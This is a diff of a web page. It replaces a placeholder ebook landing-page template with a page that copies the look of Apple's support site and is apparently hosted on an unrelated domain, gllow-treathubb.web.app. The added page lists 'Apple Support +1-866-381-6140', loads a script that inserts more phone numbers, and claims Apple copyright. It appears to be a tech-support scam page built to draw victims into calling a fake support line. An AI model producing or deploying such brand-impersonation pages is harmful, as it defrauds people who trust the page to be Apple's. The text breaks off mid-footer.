@@ -1,12 +1,8 @@
-<?php
-?>
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-	   <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+<head>
+  <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5039402,4,511,95,18,00000000']);
+_Hasync.push(['Histats.start', '1,5039569,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -14,624 +10,374 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5039402&101" alt="web tracker" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5039569&101" alt="counter create hit" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-    <meta charset="utf-8">
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MRVHLH4QHS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-MRVHLH4QHS');
+</script>
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
-    <title>Kindle : Home</title>
-    <!-- Favicon -->
-    <link rel="shortcut icon" type="image/icon" href="assets/images/favicon.ico"/>
-    <!-- Font Awesome -->
-    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
-    <!-- Bootstrap -->
-    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
-    <!-- Slick slider -->
-    <link href="assets/css/slick.css" rel="stylesheet">
-    <!-- Theme color -->
-    <link id="switcher" href="assets/css/theme-color/default-theme.css" rel="stylesheet">
-
-    <!-- Main Style -->
-    <link href="style.css" rel="stylesheet">
-
-    <!-- Fonts -->
-
-    <!-- Open Sans for body font -->
-	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,400i,600,700,800" rel="stylesheet">
-    <!-- Lato for Title -->
-  	<link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet"> 
- 
- 
-	
-    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-    <![endif]-->
-  </head>
-
-  <body>
-
-   	
-  	<!-- Start Header -->
-	<header id="mu-header" class="" role="banner">
-		<div class="container">
-			<nav class="navbar navbar-default mu-navbar">
-			  	<div class="container-fluid">
-				    <!-- Brand and toggle get grouped for better mobile display -->
-				    <div class="navbar-header">
-				      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
-				        <span class="sr-only">Toggle navigation</span>
-				        <span class="icon-bar"></span>
-				        <span class="icon-bar"></span>
-				        <span class="icon-bar"></span>
-				      </button>
-
-				      <!-- Text Logo -->
-				      <a class="navbar-brand" href="index.html"><i class="fa fa-book" aria-hidden="true"></i> Kindle</a>
-
-				      <!-- Image Logo -->
-				      <!-- <a class="navbar-brand" href="index.html"><img src="assets/images/logo.png"></a> -->
-
-
-				    </div>
-
-				    <!-- Collect the nav links, forms, and other content for toggling -->
-				    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
-				      	<ul class="nav navbar-nav mu-menu navbar-right">
-					        <li><a href="#">HOME</a></li>
-					        <li><a href="#mu-book-overview">OVERVIEW</a></li>
-					        <li><a href="#mu-author">AUTHOR</a></li>
-				            <li><a href="#mu-pricing">PRICE</a></li>
-				            <li><a href="#mu-testimonials">TESTIMONIALS</a></li>
-				            <li><a href="#mu-contact">CONTACT</a></li>
-				      	</ul>
-				    </div><!-- /.navbar-collapse -->
-			  	</div><!-- /.container-fluid -->
-			</nav>
-		</div>
-	</header>
-	<!-- End Header -->
-
-	<!-- Start Featured Slider -->
-
-	<section id="mu-hero">
-		<div class="container">
-			<div class="row">
-
-				<div class="col-md-6 col-sm-6 col-sm-push-6">
-					<div class="mu-hero-right">
-						<img src="assets/images/ebook.png" alt="Ebook img">
-					</div>
-				</div>
-
-				<div class="col-md-6 col-sm-6 col-sm-pull-6">
-					<div class="mu-hero-left">
-						<h1>Perfect Landing Page Template to Present Your eBook</h1>
-						<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Quam saepe, recusandae quidem nulla! Eveniet explicabo perferendis aut, ab quos omnis labore laboriosam quisquam hic deserunt ipsum maxime aspernatur velit impedit.</p>
-						<a href="#" class="mu-primary-btn">Download Now!</a>
-						<span>*Avaliable in PDF, ePUB, Mobi & Kindle.</span>
-					</div>
-				</div>	
-
-			</div>
-		</div>
-	</section>
-	
-	<!-- Start Featured Slider -->
-	
-	<!-- Start main content -->
-		
-	<main role="main">
-
-		<!-- Start Counter -->
-		<section id="mu-counter">
-			<div class="container">
-				<div class="row">
-					<div class="col-md-12">
-						<div class="mu-counter-area">
-
-							<div class="mu-counter-block">
-								<div class="row">
-
-									<!-- Start Single Counter -->
-									<div class="col-md-3 col-sm-6">
-										<div class="mu-single-counter">
-											<i class="fa fa-files-o" aria-hidden="true"></i>
-											<div class="counter-value" data-count="650">0</div>
-											<h5 class="mu-counter-name">Total Pages</h5>
-										</div>
-									</div>
-									<!-- / Single Counter -->
-
-									<!-- Start Single Counter -->
-									<div class="col-md-3 col-sm-6">
-										<div class="mu-single-counter">
-											<i class="fa fa-file-text-o" aria-hidden="true"></i>
-											<div class="counter-value" data-count="422">0</div>
-											<h5 class="mu-counter-name">Chapters</h5>
-										</div>
-									</div>
-									<!-- / Single Counter -->
-
-									<!-- Start Single Counter -->
-									<div class="col-md-3 col-sm-6">
-										<div class="mu-single-counter">
-											<i class="fa fa-users" aria-hidden="true"></i>
-											<div class="counter-value" data-count="1055">0</div>
-											<h5 class="mu-counter-name">Active Readers</h5>
-										</div>
-									</div>
-									<!-- / Single Counter -->
-
-									<!-- Start Single Counter -->
-									<div class="col-md-3 col-sm-6">
-										<div class="mu-single-counter">
-											<i class="fa fa-trophy" aria-hidden="true"></i>
-											<div class="counter-value" data-count="03">0</div>
-											<h5 class="mu-counter-name">Got Awards</h5>
-										</div>
-									</div>
-									<!-- / Single Counter -->
-
-								</div>
-							</div>
-
-
-						</div>
-					</div>
-				</div>
-			</div>
-		</section>
-		<!-- End Counter -->
-
-		<!-- Start Book Overview -->
-		<section id="mu-book-overview">
-			<div class="container">
-				<div class="row">
-					<div class="col-md-12">
-						<div class="mu-book-overview-area">
-
-							<div class="mu-heading-area">
-								<h2 class="mu-heading-title">Book Overview</h2>
-								<span class="mu-header-dot"></span>
-								<p>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever</p>
-							</div>
-
-							<!-- Start Book Overview Content -->
-							<div class="mu-book-overview-content">
-								<div class="row">
-
-									<!-- Book Overview Single Content -->
-									<div class="col-md-3 col-sm-6">
-										<div class="mu-book-overview-single">
-											<span class="mu-book-overview-icon-box">
-												<i class="fa fa-area-chart" aria-hidden="true"></i>
-											</span>
-											<h4>Chapter One</h4>
-											<p>Lorem ipsum dolor sit amet, consect adipis elit minim veniam ettis inkeras.</p>
-										</div>
-									</div>
-									<!-- / Book Overview Single Content -->
-
-									<!-- About Us Single Content -->
-									<div class="col-md-3 col-sm-6">
-										<div class="mu-book-overview-single">
-											<span class="mu-book-overview-icon-box">
-												<i class="fa fa-cubes" aria-hidden="true"></i>
-											</span>
-											<h4>Chapter Two</h4>
-											<p>Lorem ipsum dolor sit amet, consect adipis elit minim veniam ettis inkeras.</p>
-										</div>
-									</div>
-									<!-- / Book Overview Single Content -->
-
-									<!-- About Us Single Content -->
-									<div class="col-md-3 col-sm-6">
-										<div class="mu-book-overview-single">
-											<span class="mu-book-overview-icon-box">
-												<i class="fa fa-modx" aria-hidden="true"></i>
-											</span>
-											<h4>Chapter Three</h4>
-											<p>Lorem ipsum dolor sit amet, consect adipis elit minim veniam ettis inkeras.</p>
-										</div>
-									</div>
-									<!-- / Book Overview Single Content -->
-
-									<!-- About Us Single Content -->
-									<div class="col-md-3 col-sm-6">
-										<div class="mu-book-overview-single">
-											<span class="mu-book-overview-icon-box">
-												<i class="fa fa-files-o" aria-hidden="true"></i>
-											</span>
-											<h4>Chapter Four</h4>
-											<p>Lorem ipsum dolor sit amet, consect adipis elit minim veniam ettis inkeras.</p>
-										</div>
-									</div>
-									<!-- / Book Overview Single Content -->
-
-									<!-- Book Overview Single Content -->
-									<div class="col-md-3 col-sm-6">
-										<div class="mu-book-overview-single">
-											<span class="mu-book-overview-icon-box">
-												<i class="fa fa-file-pdf-o" aria-hidden="true"></i>
-											</span>
-											<h4>Chapter Five</h4>
-											<p>Lorem ipsum dolor sit amet, consect adipis elit minim veniam ettis inkeras.</p>
-										</div>
-									</div>
-									<!-- / Book Overview Single Content -->
-
-									<!-- About Us Single Content -->
-									<div class="col-md-3 col-sm-6">
-										<div class="mu-book-overview-single">
-											<span class="mu-book-overview-icon-box">
-												<i class="fa fa-language" aria-hidden="true"></i>
-											</span>
-											<h4>Chapter Six</h4>
-											<p>Lorem ipsum dolor sit amet, consect adipis elit minim veniam ettis inkeras.</p>
-										</div>
-									</div>
-									<!-- / Book Overview Single Content -->
-
-									<!-- About Us Single Content -->
-									<div class="col-md-3 col-sm-6">
-										<div class="mu-book-overview-single">
-											<span class="mu-book-overview-icon-box">
-												<i class="fa fa-gg" aria-hidden="true"></i>
-											</span>
-											<h4>Chapter Seven</h4>
-											<p>Lorem ipsum dolor sit amet, consect adipis elit minim veniam ettis inkeras.</p>
-										</div>
-									</div>
-									<!-- / Book Overview Single Content -->
-
-									<!-- About Us Single Content -->
-									<div class="col-md-3 col-sm-6">
-										<div class="mu-book-overview-single">
-											<span class="mu-book-overview-icon-box">
-												<i class="fa fa-wpforms" aria-hidden="true"></i>
-											</span>
-											<h4>Chapter Eight</h4>
-											<p>Lorem ipsum dolor sit amet, consect adipis elit minim veniam ettis inkeras.</p>
-										</div>
-									</div>
-									<!-- / Book Overview Single Content -->
-
-								</div>
-							</div>
-							<!-- End Book Overview Content -->
-
-						</div>
-					</div>
-				</div>
-			</div>
-		</section>
-		<!-- End Book Overview -->
-
-		
-
-		<!-- Start Video Review -->
-		<section id="mu-video-review">
-			<div class="container">
-				<div class="row">
-					<div class="col-md-12">
-						<div class="mu-video-review-area">
-
-							<div class="mu-heading-area">
-								<h2 class="mu-heading-title">Check Out Our Video Review</h2>
-								<span class="mu-header-dot"></span>
-								<p>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever</p>
-							</div>
-
-							<!-- Start Video Review Content -->
-							<div class="mu-video-review-content">
-								<iframe class="mu-video-iframe" width="100%" height="480" src="https://www.youtube.com/embed/T4ySAlBt2Ug" frameborder="0" allowfullscreen></iframe>
-							</div>
-							<!-- End Video Review Content -->
-
-						</div>
-					</div>
-				</div>
-			</div>
-		</section>
-		<!-- End Video Review -->
-
-		<!-- Start Author -->
-		<section id="mu-author">
-			<div class="container">
-				<div class="row">
-					<div class="col-md-12">
-						<div class="mu-author-area">
-
-							<div class="mu-heading-area">
-								<h2 class="mu-heading-title">About The Author</h2>
-								<span class="mu-header-dot"></span>
-							</div>
-
-							<!-- Start Author Content -->
-							<div class="mu-author-content">
-								<div class="row">
-									<div class="col-md-6">
-										<div class="mu-author-image">
-											<img src="assets/images/author.jpg" alt="Author Image">
-										</div>
-									</div>
-									<div class="col-md-6">
-										<div class="mu-author-info">
-											<h3>John Doe</h3>
-											<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Illo suscipit facilis ipsum ullam reiciendis odio error iste neque ratione libero rem accusamus voluptatibus, nihil unde maiores sunt nisi. Assumenda, consectetur.</p>
-
-											<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Voluptate, dolorem error neque! Dolores similique ut iusto odit esse ipsam, nesciunt pariatur animi minima maiores mollitia cupiditate ad ipsum deleniti perspiciatis!</p>
-											<img class="mu-author-sign" src="assets/images/author-signature.png" alt="Author Signature">
-
-											<div class="mu-author-social">
-												<a href="#"><i class="fa fa-facebook"></i></a>
-												<a href="#"><i class="fa fa-twitter"></i></a>
-												<a href="#"><i class="fa fa-linkedin"></i></a>
-												<a href="#"><i class="fa fa-google-plus"></i></a>
-											</div>
-
-										</div>
-									</div>
-								</div>
-							</div>
-							<!-- End Author Content -->
-
-						</div>
-					</div>
-				</div>
-			</div>
-		</section>
-		<!-- End Author -->
-
-		<!-- Start Pricing -->
-		<section id="mu-pricing">
-			<div class="container">
-				<div class="row">
-					<div class="col-md-12">
-						<div class="mu-pricing-area">
-
-							<div class="mu-heading-area">
-								<h2 class="mu-heading-title">Our Pricing Plans</h2>
-								<span class="mu-header-dot"></span>
-								<p>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever</p>
-							</div>
-
-							<!-- Start Pricing Content -->
-							<div class="mu-pricing-content">
-								<div class="row">
-
-									<!-- Pricing Single Content -->
-									<div class="col-sm-6 col-md-4">
-										<div class="mu-pricing-single">
-
-											<div class="mu-pricing-single-head">
-												<h4>STANDARD PLAN</h4>
-												<p class="mu-price-tag">
-													<span>$</span> 15
-												</p>
-											</div>
-
-											<ul class="mu-price-feature">
-												<li> Lorem ipsum dolor sit amet. </li>
-												<li> Lorem ipsum dolor sit amet. </li>
-												<li> Lorem ipsum dolor sit amet. </li>
-												<li> Lorem ipsum dolor sit amet. </li>
-											</ul>
-
-											<div class="mu-pricing-single-footer">
-												<a href="#" class="mu-order-btn">Order Now!</a>
-											</div>
-
-										</div>
-									</div>
-									<!-- / Pricing Single Content -->
-
-									<!-- Pricing Single Content -->
-									<div class="col-sm-6 col-md-4">
-										<div class="mu-pricing-single mu-popular-price-tag">
-
-
-											<div class="mu-pricing-single-head">
-												<h4>PROFESSIONAL PLAN</h4>
-												<p class="mu-price-tag">
-													<span>$</span> 25
-												</p>
-											</div>
-
-											<ul class="mu-price-feature">
-												<li> Lorem ipsum dolor sit amet. </li>
-												<li> Lorem ipsum dolor sit amet. </li>
-												<li> Lorem ipsum dolor sit amet. </li>
-												<li> Lorem ipsum dolor sit amet. </li>
-											</ul>
-
-											<div class="mu-pricing-single-footer">
-												<a href="#" class="mu-order-btn">Order Now!</a>
-											</div>
-											
-
-										</div>
-									</div>
-									<!-- / Pricing Single Content -->
-
-									<!-- Pricing Single Content -->
-									<div class="col-sm-6 col-md-4">
-										<div class="mu-pricing-single">
-
-
-											<div class="mu-pricing-single-head">
-												<h4>EXCLUSIVE PLAN</h4>
-												<p class="mu-price-tag">
-													<span>$</span> 45
-												</p>
-											</div>
-
-											<ul class="mu-price-feature">
-												<li> Lorem ipsum dolor sit amet. </li>
-												<li> Lorem ipsum dolor sit amet. </li>
-												<li> Lorem ipsum dolor sit amet. </li>
-												<li> Lorem ipsum dolor sit amet. </li>
-											</ul>
-
-											<div class="mu-pricing-single-footer">
-												<a href="#" class="mu-order-btn">Order Now!</a>
-											</div>
-											
-											
-										</div>
-									</div>
-									<!-- / Pricing Single Content -->
-
-
-								</div>
-							</div>
-							<!-- End Pricing Content -->
-
-						</div>
-					</div>
-				</div>
-			</div>
-		</section>
-		<!-- End Pricing -->
-
-		<!-- Start Testimonials -->
-		<section id="mu-testimonials">
-			<div class="container">
-				<div class="row">
-					<div class="col-md-12">
-						<div class="mu-testimonials-area">
-							<div class="mu-heading-area">
-								<h2 class="mu-heading-title">What Our Readers Says</h2>
-								<span class="mu-header-dot"></span>
-							</div>
-
-							<div class="mu-testimonials-block">
-								<ul class="mu-testimonial-slide">
-
-									<li>
-										<p>"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever."</p>
-										<img class="mu-rt-img" src="assets/images/reader-1.jpg" alt="img">
-										<h5 class="mu-rt-name"> - Alice Boga</h5>
-										<span class="mu-rt-title">CEO, Apple Inc.</span>
-									</li>
-
-									<li>
-										<p>"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever."</p>
-										<img class="mu-rt-img" src="assets/images/reader-2.jpg" alt="img">
-										<h5 class="mu-rt-name"> - Jhon Doe</h5>
-										<span class="mu-rt-title">Director, Google Inc.</span>
-									</li>
-
-									<li>
-										<p>"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever."</p>
-										<img class="mu-rt-img" src="assets/images/reader-3.jpg" alt="img">
-										<h5 class="mu-rt-name"> - Jessica Doe</h5>
-										<span class="mu-rt-title">Web Developer</span>
-									</li>
-
-								</ul>
-							</div>
-
-
-						</div>
-					</div>
-				</div>
-			</div>
-		</section>
-		<!-- End Testimonials -->
-
-	
-		<!-- Start Contact -->
-		<section id="mu-contact">
-			<div class="container">
-				<div class="row">
-					<div class="col-md-12">
-						<div class="mu-contact-area">
-
-							<div class="mu-heading-area">
-								<h2 class="mu-heading-title">Drop Us A Message</h2>
-								<span class="mu-header-dot"></span>
-								<p>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever</p>
-							</div>
-
-							<!-- Start Contact Content -->
-							<div class="mu-contact-content">
-
-								<div id="form-messages"></div>
-								<form id="ajax-contact" method="post" action="mailer.php" class="mu-contact-form">
-									<div class="form-group">                
-										<input type="text" class="form-control" placeholder="Name" id="name" name="name" required>
-									</div>
-									<div class="form-group">                
-										<input type="email" class="form-control" placeholder="Enter Email" id="email" name="email" required>
-									</div>              
-									<div class="form-group">
-										<textarea class="form-control" placeholder="Message" id="message" name="message" required></textarea>
-									</div>
-									<button type="submit" class="mu-send-msg-btn"><span>SUBMIT</span></button>
-						        </form>
-
-							</div>
-							<!-- End Contact Content -->
-
-						</div>
-					</div>
-				</div>
-			</div>
-		</section>
-		<!-- End Contact -->
-
-		<!-- Start Google Map -->
-		<section id="mu-google-map">
-			<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d589888.4396405783!2d-82.41588603632052!3d32.866951223053896!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x88f9f727a4ed30eb%3A0xf2139b0c5c7ae1ec!2sDooley+Branch+Rd%2C+Millen%2C+GA+30442%2C+USA!5e0!3m2!1sen!2sbd!4v1497376364225" width="100%" height="500" frameborder="0" style="border:0" allowfullscreen></iframe>
-		</section>
-		<!-- End Google Map -->
-
-	</main>
-	
-	<!-- End main content -->	
-			
-			
-	<!-- Start footer -->
-	<footer id="mu-footer" role="contentinfo">
-		<div class="container">
-			<div class="mu-footer-area">
-				<div class="mu-social-media">
-					<a href="#"><i class="fa fa-facebook"></i></a>
-					<a href="#"><i class="fa fa-twitter"></i></a>
-					<a href="#"><i class="fa fa-google-plus"></i></a>
-					<a href="#"><i class="fa fa-linkedin"></i></a>
-				</div>
-				<p class="mu-copyright">&copy; Copyright <a rel="nofollow" href="http://markups.io">markups.io</a>. All right reserved.</p>
-			</div>
-		</div>
-
-	</footer>
-	<!-- End footer -->
-
-	
-	
-    <!-- jQuery library -->
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
-    <!-- Include all compiled plugins (below), or include individual files as needed -->
-    <!-- Bootstrap -->
-    <script src="assets/js/bootstrap.min.js"></script>
-	<!-- Slick slider -->
-    <script type="text/javascript" src="assets/js/slick.min.js"></script>
-    <!-- Counter js -->
-    <script type="text/javascript" src="assets/js/counter.js"></script>
-    <!-- Ajax contact form  -->
-    <script type="text/javascript" src="assets/js/app.js"></script>
-   
- 
-	
-    <!-- Custom js -->
-	<script type="text/javascript" src="assets/js/custom.js"></script>
-	
-    
-  </body>
-</html>
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-866-381-6140 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
